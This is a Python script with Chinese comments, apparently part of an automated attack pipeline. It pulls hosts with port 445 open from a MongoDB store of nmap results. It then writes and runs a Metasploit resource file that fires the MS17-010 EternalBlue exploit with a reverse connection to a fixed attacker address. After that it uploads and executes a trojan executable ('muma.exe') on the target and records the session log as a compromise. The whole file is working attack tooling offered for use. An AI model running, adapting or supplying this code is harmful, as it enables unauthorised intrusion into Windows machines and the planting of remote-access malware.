# -*- coding:utf-8 -*-
import pymongo
import os

def readtargert():   #在数据库中寻找目标
    client = pymongo.MongoClient(host='localhost', port=27017)  # 连接数据库
    db = client.nmapy  # 指定数据库
    set = db.scanre  # 指定要操作的集合
    print('获取目标：')
    for ip in set.find():
        if (ip['port'] == '445') & (ip['state'] == 'open'):
            host = ip['host']
            print('445端口开放目标:' + host)
    return host


def Handler(configFile, lhost, lport, rhost):  #漏洞利用参数

    configFile.write('use exploit/windows/smb/ms17_010_eternalblue\n')

    configFile.write('set LPORT ' + str(lport) + '\n')

    configFile.write('set LHOST ' + str(lhost) + '\n')

    configFile.write('set RHOST ' + str(rhost) + '\n')

    configFile.write('spool log.txt\n')

    configFile.write('exploit\n')

    configFile.write('upload /root/Payloads/muma.exe c:\\ \n')

    configFile.write('execute -f c:\\muma.exe')

    configFile.write('spool off\n')


def writedb():  #msf日志文件路径存库
    a = os.getcwd()  # 获取当前路径
    path = {}
    path['logfile'] = (a + '/log.txt')
    client = pymongo.MongoClient(host='localhost', port=27017)  # 连接数据库
    db = client.nmapy
    set = db.compromise
    set.insert_one(path)

def main():

    rhost = readtargert()

    configFile = open('ms17_010.rc', 'w')

    lhost = '192.168.1.216'

    lport = 4444

    Handler(configFile, lhost, lport, rhost)

    configFile.close()

    print('开始metasploitl利用：')

    os.system('msfconsole -q -r ms17_010.rc')

    writedb()



main()
